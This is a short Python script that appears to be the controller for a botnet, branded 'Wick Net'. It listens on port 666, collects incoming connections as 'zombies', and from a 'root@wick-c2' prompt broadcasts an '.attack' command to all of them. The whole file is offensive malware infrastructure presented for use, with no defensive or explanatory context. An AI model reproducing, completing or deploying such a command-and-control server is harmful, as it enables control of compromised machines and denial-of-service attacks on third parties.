from socket import socket , AF_INET , SOCK_STREAM
from threading import Thread as thr
from os import system , name , getpid
from time import sleep as slp
from colorama import Fore , init
from os import kill as killx

init()

red = Fore.LIGHTRED_EX; green = Fore.LIGHTGREEN_EX; blue = Fore.LIGHTBLUE_EX; yellow = Fore.LIGHTYELLOW_EX; cyan = Fore.LIGHTCYAN_EX; white = Fore.LIGHTWHITE_EX; magenta = Fore.LIGHTMAGENTA_EX;

s = socket(AF_INET,SOCK_STREAM)
s.bind(('0.0.0.0',666))
s.listen()

system('cls' if name == 'nt' else 'clear')

wick = f'''
            {cyan}██╗    ██╗██╗ ██████╗██╗  ██╗    ███╗   ██╗███████╗████████╗
            ██║    ██║██║██╔════╝██║ ██╔╝    ████╗  ██║██╔════╝╚══██╔══╝
            ██║ █╗ ██║██║██║     █████╔╝     ██╔██╗ ██║█████╗     ██║   
            ██║███╗██║██║██║     ██╔═██╗     ██║╚██╗██║██╔══╝     ██║   
            ╚███╔███╔╝██║╚██████╗██║  ██╗    ██║ ╚████║███████╗   ██║   
            ╚══╝╚══╝ ╚═╝ ╚═════╝╚═╝  ╚═╝    ╚═╝  ╚═══╝╚══════╝   ╚═╝   
                        {red}Created By {blue}John Wick {red}( v{cyan}.{white}1{cyan}.{white}0 {red})
                              {yellow}Team {blue}Pytho {red}Learn
                                                            
'''

print(wick)

zombies = []
def app(conn, add):
	zombies.append(conn)

def main():
    while True:
        try:
            c = input(f'{red}root@wick-c2#~${white} ')
        except:
              pass
        if c == '.attack':
            for zombie in zombies:
                    try:
                        zombie.send(c.encode())
                    except:
                        pass
        elif c == 'exit':
            killx(getpid(), 9)
        elif c == 'clear':
              system('cls' if name == 'nt' else 'clear')


thr(target=main).start()

while True:
	try:	
		a1, a2 = s.accept()
		app(a1,a2)
	except:
		pass